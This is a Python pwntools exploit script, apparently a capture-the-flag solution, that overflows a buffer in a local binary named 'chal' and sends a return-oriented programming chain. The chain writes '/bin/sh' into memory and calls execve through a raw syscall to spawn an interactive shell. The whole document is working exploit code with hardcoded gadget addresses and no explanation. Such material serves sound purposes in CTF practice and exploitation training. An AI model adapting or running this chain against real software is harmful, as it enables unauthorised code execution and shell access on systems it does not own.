from pwn import *

r=process("./chal")
'''
0x000000000044fc47 : pop rax ; ret
0x0000000000401e4f : pop rdi ; ret
0x0000000000409ebe : pop rsi ; ret
0x00000000004859cb : pop rdx ; pop rbx ; ret
0x0000000000487dca : mov qword ptr [rsi], rdx ; ret
0x0000000000401c04 : syscall
'''

#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(r)

pop_rax_ret = 0x44fc47
pop_rdi_ret = 0x401e4f
pop_rsi_ret = 0x409ebe
pop_rdx_rbx_ret = 0x4859cb

mov_rdx_to_rsi_ret = 0x487dca
syscall = 0x401c04

binsh = 0x4c7a30

ROPchain1 = p64(pop_rdx_rbx_ret) + b'/bin/sh\x00'.ljust(8,b'\x00') + p64(0)
ROPchain1 += p64(pop_rsi_ret) + p64(binsh)
ROPchain1 += p64(mov_rdx_to_rsi_ret)

ROPchain2 = p64(pop_rax_ret)+p64(0x3b)
ROPchain2 += p64(pop_rdi_ret) + p64(binsh)
ROPchain2 += p64(pop_rsi_ret) + p64(0)
ROPchain2 += p64(pop_rdx_rbx_ret) + p64(0) + p64(0)
ROPchain2 += p64(syscall)

print("BINSH: ",hex(binsh))

ROPchain = b'a' * 0x10 + ROPchain1 + ROPchain2

r.sendline(ROPchain)



r.interactive()
